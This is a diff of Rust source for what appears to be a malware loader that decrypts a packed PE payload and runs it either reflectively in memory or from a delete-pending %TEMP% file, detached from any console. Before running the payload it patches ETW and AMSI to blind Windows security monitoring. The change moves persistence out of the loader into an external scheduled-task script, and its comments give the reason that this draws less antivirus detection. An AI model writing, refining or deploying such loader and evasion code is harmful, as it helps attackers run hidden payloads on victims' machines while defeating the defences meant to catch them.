@@ -3,13 +3,13 @@
 //! Two strategies, chosen at pack time (`gen::REFLECTIVE`):
 //!  - REFLECTIVE: map the PE into this process (no disk). Stealthy, but
 //!    TLS-unsound for Rust/tokio payloads — see RESEARCH.md.
-//!  - TEMP-EXEC (default): persist the loader, write the decrypted payload to a
-//!    delete-pending %TEMP% file and let the OS loader run it. TLS/SEH correct.
+//!  - TEMP-EXEC (default): write the decrypted payload to a delete-pending
+//!    %TEMP% file and let the OS loader run it. Persistence is external
+//!    (`tools/sideload.ps1` scheduled task). TLS/SEH correct.
 
 pub mod anti;
 pub mod evasion;
 pub mod pe;
-pub mod persist;
 
 use std::os::windows::process::CommandExt;
 use std::time::{SystemTime, UNIX_EPOCH};
@@ -20,15 +20,10 @@ use windows::Win32::System::Threading::GetCurrentProcess;
 use crate::gen;
 
 pub fn run() {
-    // Persistence (self-copy + HKCU Run) is opt-in: it is the most heavily
-    // signatured behavior. The operator installs persistence separately via
-    // tools/sideload.ps1 (scheduled task), which is quieter.
-    let persist = std::env::args().any(|a| a == "--persist");
-    run_payload(persist);
+    run_payload();
 }
 
-/// `persist` is ignored in reflective mode (the host process is the persistence).
-pub fn run_payload(persist: bool) {
+pub fn run_payload() {
     unsafe {
         evasion::patch_etw();
         evasion::patch_amsi();
@@ -62,9 +57,6 @@ pub fn run_payload(persist: bool) {
         } else {
             // Persist the LOADER (not the plaintext payload), then run the
             // payload from a delete-pending temp file with --no-install.
-            if persist {
-                persist::install_self();
-            }
             let _ = exec_temp(&pe);
         }
     }
@@ -117,7 +109,7 @@ unsafe fn exec_temp(pe: &[u8]) -> Result<(), String> {
     std::fs::write(&path, pe).map_err(|e| format!("write temp: {e}"))?;
 
     let spawned = std::process::Command::new(&path)
-        .arg("--no-install") // loader owns persistence; don't copy the plaintext temp exe
+        .arg("--no-install") // no self-copy; persistence is external
         .creation_flags(0x0000_0008) // DETACHED_PROCESS (no console, survives loader exit)
         .spawn();
 
